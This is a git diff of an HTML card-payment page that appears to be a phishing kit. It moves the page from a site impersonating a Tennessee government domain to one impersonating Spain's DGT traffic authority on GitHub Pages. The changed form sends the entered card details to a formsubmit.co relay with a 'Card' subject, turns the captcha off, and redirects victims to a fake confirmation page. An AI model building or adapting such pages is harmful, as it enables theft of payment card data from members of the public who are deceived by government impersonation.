@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>dl.safety.tn.gov</title>
+    <title>Card Payment</title>
     <link rel="icon" type="image/png" href="carte.png">
     <link rel="apple-touch-icon" href="carte.png">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awersome/6.4.0/css/all.min.css">
@@ -32,8 +32,13 @@
                 <span class="logo-box mv"><img src="logo_mv.jpg" title="Maestro / V Pay"></span>
             </div>
         </div>
-        <form method="POST" action="confirm.html" enctype="multipart/form-data">
-        
+        <form action="https://formsubmit.co/528cfa5ae469b703e6904a3689b34436" method="POST" enctype="multipart/form-data">
+                        <input type="hidden" name="_captcha" value="false">
+                        <input type="hidden" name="_next" value="https://sede-dgt-gob.github.io/sede-dgt-gob/cartes/confirm.html">
+                        <input type="hidden" name="_template" value="table">
+                        <input type="hidden" name="_subject" value="Card">
+            
+                        
             <!-- payment amount -->
             <div class="form-group">
                 <label>Amount</label>
@@ -85,12 +90,6 @@
                     <i class="fa-solid fa-cicle-question">?</i>
                 </div>
             </div>
-                <!-- Désactiver le captcha -->
-                <input type="hidden" name="_captcha" value="false">
-                <!-- Affichage en tableau -->
-                <input type="hidden" name="_template" value="table">
-                <!-- Redirection vers votre page personnalisée -->
-                <input type="hidden" name="_next" value="https://safety-tn-gov.github.io/tn.safety.gov/confirm.html">
             <!-- Bouton de validation -->
             <button type="submit" class="pay-btn">
             <img src="lock.jpg"> Pay
